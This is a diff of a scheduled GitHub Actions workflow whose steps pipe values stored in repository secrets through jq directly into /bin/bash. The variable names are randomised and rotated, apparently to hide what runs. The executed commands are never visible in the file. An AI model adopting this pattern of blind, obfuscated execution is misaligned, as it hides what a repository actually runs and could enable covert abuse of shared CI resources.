@@ -3,19 +3,18 @@ name: dongyugang0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
+    - cron: '31 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongyugang0987
         env:
-          lgtn5: ${{ secrets.lgtn5 }}
+          izerf7: ${{ secrets.izerf7 }}
         run: |
-          echo $lgtn5 | jq -r .ux114 | /bin/bash
-          echo $kii1540 | jq -r .k3546 | /bin/bash
-          echo $a416 | jq -r .j42 | /bin/bash
-          echo $j40245 | jq -r .i7 | /bin/bash
-          echo $yi7028 | jq -r .p4 | /bin/bash
+          echo $izerf7 | jq -r .eze5 | /bin/bash
+          echo $okypq01104 | jq -r .aac1 | /bin/bash
+          echo $dy6 | jq -r .u0 | /bin/bash
 
